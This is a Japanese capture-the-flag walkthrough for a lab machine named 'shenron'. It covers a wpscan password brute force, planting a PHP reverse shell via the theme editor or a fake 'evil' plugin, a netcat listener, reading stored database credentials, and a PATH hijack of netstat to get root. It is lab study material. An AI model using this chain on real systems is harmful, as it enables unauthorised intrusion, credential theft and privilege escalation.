## 事前に辞書を作っておく
- `grep -B 100 iloverockyou /usr/share/wordlists/rockyou.txt > shenron.txt`

### 論点
- wpscanでbruteforce,reverse-shellへ書き込み(mr-robot似てる)
- PATHハイジャック(nullbyteに似てる)
### keyword
- /etc/hosts,
### 補足
- pspy,404.phpに書き込む,pluginにアップロード


## 攻略
- nmap
  - 80,wordpressであることがわかる 

- サイトを見たら崩れているので、hostsを書き換える。view page sourceを見る
- `sudo vim /etc/hosts`
- gobusterする
  - 特に何もない 
- `wpscan --url http://shenron/ -e u,p`
  - admin
- `wpscan --url http://shenron/ -U admin -P shenron.txt`
  - passwordは`iloverockyou`であることがわかる 
- wp-login.phpからダッシュボードに接続する
- reverse-shellをする
  - Appearance -> Editor
  - 右側にTemplatesがあって、その下に青文字でArchives(archive.php)がある。ちなみに404 Templateでもできる
  - ここにあるのを全部削除して、php-reverse-shell.phpを書き込んで下にUpdate Fileがあるので保存する
  - Parrotで待ち受ける
  - `nc -nlvp 9001`
  - websiteから起動する
  - `http://shenron/wp-content/themes/twentyeleven/archive.php`または404 Templateに書いた場合はarchive.phpを404.phpにする
  - これでもできない場合は、php-reverse-shellが間違っているので新しいのをとってくる。
  - (追記)pluginでもできる。下に書いてある
- ユーザを調べる
  - shenronがいる 
- 設定ファイルを見る
  - wordpress:Wordpress@123
- shenronにユーザを変える
  - `su shenron`
- SUIDを調べる
  - `find / -perm -u=s -type f 2>/dev/null`
  - /home/shenron/networkがあるpkexecもいけそう   
- psコマンド
  - `ps aux | grep -v root`
    - www-dataでapache2,mysqlでmysqld, 
  - `ps aux | grep root`
    - apache2,cron 
- /home/を見る
  - networkコマンドがあるので、実行してみると内部でnetstatコマンドが動いているのがわかる
  - fileはあるが、stringsコマンドがないので調べられない
  - netstatコマンドを見るとroot権限で動いているのがわかる
- PATHハイジャックでrootを取得する。これはroot権限で実行されているコマンドを特定のユーザに置いているのが脆弱性
- PATHハイジャックを利用してrootになる要件
  - 所有者がroot
  - 誰でも実行できる
  - 内部のコマンドがフルパスで書かれていない

```
cd /tmp
echo "/bin/bash" > netstat
chmod 777 netstat
export PATH=/tmp:$PATH
cd /home/shenron
./network
```
- rootになれる

## 補足
- pluginでする
- php-reverse-shell.phpをコピーして名前をevil.phpにして用意しておく
- 次のファイル、banner.phpを作る

```
<?
/*
Plugin Name: PHP Web Shell
Version: 1.0.0
Author: evil
Author URI: http://evil
*/
?>
```

- この２つのファイルを圧縮する
  - `zip evil evil.php banner.php`
- wordpressにuploadする。Pluginsを押す。Add Newを押す。Upload Pluginを選択してブラウザからさっき作ったevil.zipを選択して、右にあるinstall nowを選択
- Plugins一覧から、さっきUploadしたのをactivateすると色が変わる
- Parrotで待ち受ける
- ブラウザから次にアクセスする`http://shenron/wp-content/plugins/evil/evil.php` 
